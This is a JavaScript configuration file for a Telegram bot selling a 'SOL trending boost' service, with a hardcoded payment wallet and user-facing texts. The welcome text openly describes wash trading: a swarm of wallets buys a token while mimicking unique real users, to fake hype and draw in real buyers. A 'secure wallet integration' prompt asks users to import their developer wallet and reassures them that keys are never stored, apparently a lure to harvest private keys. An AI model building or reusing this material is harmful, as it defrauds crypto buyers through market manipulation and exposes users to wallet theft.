require("dotenv").config();

module.exports = {
  BOT_TOKEN: process.env.BOT_TOKEN,
  ADMIN_ID: process.env.ADMIN_ID,
  ADMIN_HANDLE: `@${(process.env.ADMIN_USERNAME || "M19_yrs").replace(/^@/, "")}`,
  PAYMENT_WALLET: `BbyDNpq4nGgABRuer1RorRqi8rjWSzGwfcnP7NLvtuZX`,

  WELCOME_TEXT: 
    `*What can AlphaBoost do?*\n\n` +
    `Welcome to the *AlphaBoost SOL Suite* — your secret weapon for hitting the top of the trending lists.\n\n` +
    `Our engine simulates organic hype using a swarm of proprietary wallets that buy your token at strategic intervals. This optimizes the Pump.fun & Raydium algorithms to recognize your token as "Breaking Out."\n\n` +
    `*How it works:*\n` +
    `✅ *Swarm Entry:* Multiple wallets buy your token rapidly\n` +
    `✅ *Human Mimicry:* Each buy looks like a unique real user\n` +
    `✅ *Trend Ignition:* Boosts your token into the Top 10\n` +
    `✅ *FOMO Magnet:* Attracts real buyers and whales\n\n` +
    `• Click a button below to begin`,

  TREND_START_TEXT: 
    `⚡️ *SOL Trending Fast-Track | TOS*\n\n` +
    `The largest trending platform in crypto with over 5.5 million daily views. Guarantee your spot with fast-track! No queue.\n\n` +
    `➤ *Click the button below to begin*`,

  PRICING_TEXT: 
    `🚀 *Trending Boost // Fast-track*\n\n` +
    `Guarantees exclusive access to fast-track the top of SOL Trending. Results appear within 10-15 minutes.\n\n` +
    `➤ *Select the trending duration below:*`,

  IMPORT_TEXT: 
    `🗂 *Secure Wallet Integration*\n\n` +
    `To sync your developer wallet with the AlphaBoost swarm, select your preferred import method below.\n\n` +
    `_Note: We utilize AES-256 encryption. Your keys are never stored on our servers._`
};